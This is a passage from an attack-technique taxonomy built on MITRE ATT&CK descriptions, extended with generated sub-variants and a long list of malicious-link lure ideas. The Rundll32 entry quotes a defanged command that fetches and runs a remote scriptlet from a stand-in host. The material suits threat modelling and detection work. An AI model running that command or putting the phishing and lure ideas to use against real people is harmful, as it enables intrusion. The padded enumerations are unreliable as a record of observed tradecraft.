        ~Citrix Gateway Attacks: Adversaries may exploit vulnerabilities in Citrix ADC/Gateway or similar application delivery controllers
        ~SSH Service Targeting: Adversaries may attempt to gain access through exposed SSH services using stolen credentials or known vulnerabilities
        ~Web-Based Remote Access: Adversaries may target web-based remote access portals like WebEx or TeamViewer
        ~Remote Management Interface Abuse: Adversaries may exploit exposed management interfaces like iLO, iDRAC, or IPMI
        ~Legacy Remote Access Services: Adversaries may target older remote access protocols like Telnet or FTP that may still be exposed
        ~Third-Party Remote Support Tools: Adversaries may abuse legitimate remote support tools like AnyDesk or LogMeIn
        ~SCADA Remote Access: Adversaries may target industrial remote access solutions used for managing SCADA systems
        ~Enterprise Service Bus Exploitation: Adversaries may target exposed enterprise service bus (ESB) interfaces that enable remote connectivity
        ~Remote Monitoring Tool Abuse: Adversaries may exploit professional RMM tools used by MSPs and IT teams
        ~Database Remote Access: Adversaries may target exposed database remote access protocols and management interfaces
        ~Remote Backup Service Access: Adversaries may exploit remote backup services and their management interfaces
        ~Network Device Remote Management: Adversaries may target exposed network device management protocols like SNMP
        ~Printer Remote Management: Adversaries may exploit exposed printer management interfaces and protocols
        ~Remote Development Tools: Adversaries may abuse exposed development tools like remote debugging interfaces
        ~Security Tool Remote Interfaces: Adversaries may target exposed security tool management interfaces like SIEM consoles or EDR management portals
        ~Remote Access Gateways: Adversaries may exploit dedicated remote access gateway appliances and their management interfaces
        ~Out-of-Band Management: Adversaries may target emergency access or out-of-band management channels designed for disaster recovery
        ~Remote File System Access: Adversaries may exploit exposed network file system protocols and services
        ~Remote Authentication Services: Adversaries may target exposed authentication services like RADIUS or LDAP
      Spearphishing via Service: Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.  A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.
        ~Social Media Platforms: Using LinkedIn, Facebook, Twitter, or other social networks to establish contact and deliver malicious content
        ~Personal Email Services: Leveraging Gmail, Yahoo, or other webmail services to bypass corporate email filters
        ~Professional Networking: Using job recruitment sites and professional forums to target employees
        ~Instant Messaging: Using WhatsApp, Telegram, or similar messaging apps to deliver malicious content
        ~Cloud Storage Services: Using Dropbox, Google Drive links to deliver malware
        ~Gaming Platforms: Using gaming service messaging systems to target specific individuals
        ~Dating Applications: Using dating apps to build rapport and deliver malicious content
        ~Forum Direct Messages: Using special interest forums to target specific individuals
        ~Code Repository Services: Using GitHub, GitLab messages to target developers
        ~Freelance Platforms: Using freelance job sites to target contractors and employees
        ~Video Platforms: Using YouTube, Vimeo private messages or comments to establish contact
        ~Online Learning Platforms: Using Coursera, Udemy, or similar educational platform messaging
        ~Conference/Event Apps: Using event-specific networking apps to target attendees
        ~Artist/Creative Platforms: Using DeviantArt, Behance, or similar creative community messages
        ~Blog Platforms: Using Medium, WordPress comments and direct messages
        ~Review Platforms: Using Yelp, Google Reviews business messaging features
        ~Collaboration Tools: Using Slack, Discord external workspaces
        ~Project Management Tools: Using Trello, Asana guest access features
        ~Customer Service Platforms: Using support ticket systems or chat services
        ~Online Marketplace Messages: Using Amazon, eBay, or other marketplace messaging systems
        ~Research Networks: Using ResearchGate, Academia.edu messaging
        ~Music Platforms: Using SoundCloud, Spotify artist messaging
        ~Location Apps: Using local community apps like Nextdoor
        ~Sports/Fitness Apps: Using Strava, Nike+, or similar community features
        ~Travel Platforms: Using AirBnB, TripAdvisor messaging
        ~Browser Extensions: Using extension store developer contact features
        ~Podcast Platforms: Using podcast hosting service messages
        ~Virtual Event Platforms: Using virtual conference networking features
        ~Industry Association Portals: Using professional organization messaging
        ~Alumni Networks: Using university alumni platform messages
      Content Injection: Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)  Adversaries may inject content to victim systems in various ways, including:  * From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM) * From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)  Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with "lawful interception."(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)
        ~Man-in-the-Middle Injection: Adversary positions themselves between legitimate client-server communications to intercept and modify traffic, injecting malicious content into the data stream
        ~Man-on-the-Side Injection: Adversary monitors traffic and injects malicious responses that race with legitimate server responses to reach the client first
        ~DNS Response Injection: Adversary compromises or manipulates DNS infrastructure to inject malicious responses to DNS queries
        ~HTTP Response Injection: Adversary injects malicious content into HTTP responses, potentially exploiting unsecured connections
        ~TCP Packet Injection: Adversary injects malicious packets into TCP streams to deliver malicious content
        ~BGP Hijacking: Adversary compromises routing infrastructure to redirect traffic through controlled nodes where content can be injected
        ~ISP-Level Injection: Adversary compromises or leverages access to ISP infrastructure to perform content injection at scale
        ~CDN Compromise: Adversary compromises content delivery networks to inject malicious content into cached responses
    execution: The adversary is trying to run malicious code.  Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.
      Rundll32: The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.  Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)  Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
        ~Control Panel Item Execution: Abuse of .cpl files and shell32.dll functions to execute malicious code through Control Panel items
        ~JavaScript/VBScript Execution: Using rundll32 to execute JavaScript or VBScript code through mshtml.dll
        ~Remote DLL Loading: Loading DLLs from remote locations or UNC paths through rundll32
        ~Ordinal-Based Execution: Calling DLL exports by ordinal numbers instead of function names to obscure execution
        ~COM Object Abuse: Leveraging COM objects through rundll32 for code execution
        ~Alternative DLL Search Order: Exploiting DLL search order to load malicious DLLs through rundll32
        ~Memory-Mapped Execution: Loading and executing DLLs directly from memory using rundll32
        ~Registry-Based Loading: Using registry keys to specify DLLs for rundll32 execution
      Regsvr32: Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)  Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.  Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)  Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)
        ~Local DLL Execution: Adversaries use Regsvr32 to load and execute local DLL files, bypassing application control by exploiting the trusted status of Regsvr32.
        ~Remote Scriptlet Loading: Adversaries leverage Regsvr32's network capabilities to load and execute COM scriptlets from remote URLs (Squiblydoo attack).
        ~COM Object Registration: Adversaries register malicious COM objects using Regsvr32 to establish persistence or execute code.
        ~Silent Registration: Adversaries use the /s switch to suppress dialog boxes, making the execution stealthier.
        ~Unregistration Abuse: Adversaries abuse the /u switch, typically used for unregistration, to execute malicious code.
        ~Alternate Data Stream Execution: Adversaries execute DLLs stored in NTFS alternate data streams using Regsvr32
        ~Proxy Loading: Adversaries use Regsvr32 to load additional proxy DLLs that then load the actual malicious payload
        ~OCX File Execution: Adversaries abuse Regsvr32's ability to register OCX files (OLE Control Extension)
        ~In-Memory DLL Loading: Adversaries use Regsvr32 to load DLLs directly into memory without touching disk
        ~Registry-Free Loading: Adversaries exploit Regsvr32's ability to load components without registry modifications
      Control Panel Items: Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)  For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)  Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.
        ~Command Line Execution: Direct execution of .cpl files through command prompt or PowerShell to run malicious code
        ~API-Based Execution: Programmatic execution through Control Panel API calls to load and execute malicious .cpl files
        ~Double-Click Exploitation: Abuse of default file association handling for .cpl files to execute malware
        ~Registry Manipulation: Creating or modifying Control Panel entries in the registry to execute malicious code
        ~DLL Side-Loading: Exploiting DLL search order to load malicious libraries through legitimate Control Panel items
        ~Custom Control Panel Applets: Creation of malicious .cpl files disguised as legitimate system utilities
        ~Whitelisting Bypass: Leveraging trusted Control Panel file extensions to bypass security controls
        ~Persistence Through CPL Registration: Installing malicious Control Panel items for persistent access
      Compiled HTML File: Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)  Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)
        ~ActiveX Control Execution: Embedding malicious ActiveX controls within CHM files to execute arbitrary code when the file is opened
        ~JavaScript Injection: Including malicious JavaScript code within CHM files that executes when specific pages are viewed
        ~VBA Macro Embedding: Incorporating Visual Basic for Applications macros within CHM files to execute malicious code
        ~ShortCut Command Execution: Using CHM file shortcuts (.lnk files) to execute commands through hh.exe
        ~HTML Application Integration: Embedding HTA files within CHM content to execute code with elevated privileges
        ~Binary Payload Concealment: Hiding executable files within CHM resources for later extraction and execution
        ~CHM Protocol Handler Abuse: Exploiting the CHM protocol handler to execute commands or access restricted resources
        ~Decompilation Protection Bypass: Using techniques to prevent reverse engineering of malicious CHM content
      User Execution: An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).  While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).  Adversaries may also deceive users into performing actions such as:  * Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary * Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023) * Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204) * Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn)  For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)
        Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).
          Send shortened URLs via social media DMs that redirect to credential harvesting pages
          Embed malicious links in QR codes distributed through physical marketing materials
          Use typosquatting domains that mimic legitimate websites to host drive-by downloads
          Create malicious links that exploit URL parsing vulnerabilities in email clients
          Distribute links through compromised social media accounts that lead to fake software updates
          Use URL parameters to exploit cross-site scripting vulnerabilities in web applications
          Create links that trigger automatic downloads of malware disguised as documents
          Use deep links that launch malicious mobile apps or exploit URL scheme handlers
          Embed links in PDF documents that exploit PDF reader vulnerabilities
          Use URL encoding tricks to obscure malicious domains in hyperlinks
          Embed malicious links in calendar invites that bypass email security filters
          Use legitimate cloud storage services (like OneDrive/SharePoint) to host malicious redirectors
          Create links that exploit iframe vulnerabilities in web-based email clients
          Distribute links through compromised business chat platforms (Slack, Teams)
          Use URI handlers to trigger local application exploits (e.g., ms-settings:// links)
          Embed links in fake software update notifications that mimic OS/application alerts
          Create links that exploit preview generators in messaging platforms
          Use URL fragments (#) to bypass security scanners while maintaining malicious functionality
          Distribute links through fake browser notifications/pop-ups
          Embed malicious links in QR codes displayed in video conferences
          Embed malicious links in collaborative document comments that trigger when resolved
          Use links in fake password reset workflows that bypass MFA
          Create links that exploit protocol handlers in IoT device web interfaces
          Distribute links through compromised digital signage systems
          Use links in fake browser extension update notifications
          Create links that exploit preview generation in code repository platforms
          Embed malicious links in QR codes displayed on fake parking tickets
          Use links that exploit cross-origin resource sharing (CORS) misconfiguration
          Distribute links through compromised smart home automation rules
          Create links that trigger malicious actions in progressive web apps
          Create links that exploit virtual meeting platform chat features to bypass corporate filters
          Use links embedded in digital business cards (vCards) that exploit contact management apps
          Distribute links through compromised smart TV applications or interfaces
          Create links that exploit browser extension manifest V3 vulnerabilities
          Use links in fake software certificate validation popups
          Embed malicious links in augmented reality (AR) markers or QR codes
          Create links that exploit single sign-on (SSO) redirect chains
          Distribute links through compromised network printer web interfaces
          Use links that exploit webhook configurations in development tools
          Create links that trigger malicious actions through browser push notifications
          Create links exploiting OAuth 2.0 authorization flows in federated authentication
